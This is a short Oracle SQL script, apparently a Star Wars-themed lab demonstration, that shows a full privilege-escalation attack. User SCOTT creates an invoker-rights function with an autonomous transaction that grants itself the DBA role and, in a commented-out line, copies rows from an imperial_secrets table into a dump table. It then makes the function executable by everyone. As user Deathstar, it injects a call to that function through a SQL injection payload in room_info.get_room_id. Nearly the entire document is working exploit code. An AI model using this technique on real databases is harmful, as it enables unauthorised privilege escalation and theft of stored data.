-------------------------------------
-- As SCOTT:
create table secret_dump (
  secret varchar2(4000),
  created timestamp default current_timestamp
);

create or replace function bad_func
  return varchar2 authid current_user
  as
    pragma autonomous_transaction;
  begin
    execute immediate 'grant dba to scott';
		--execute immediate 'insert into scott.secret_dump (secret) select secret from imperial_secrets';
		commit;
		return 'Y';
  end;
/

select * from user_sys_privs;
select * from user_role_privs;

grant execute on bad_func to public;
grant insert on secret_dump to public;


-- Exploit SQL Injection
--------------------------------------
-- As Deathstar:
select room_info.get_room_id(''') and scott.bad_func() = ''Y''--') from dual;

-------------------------------------
-- As SCOTT:
-- Now let's see
select * from secret_dump;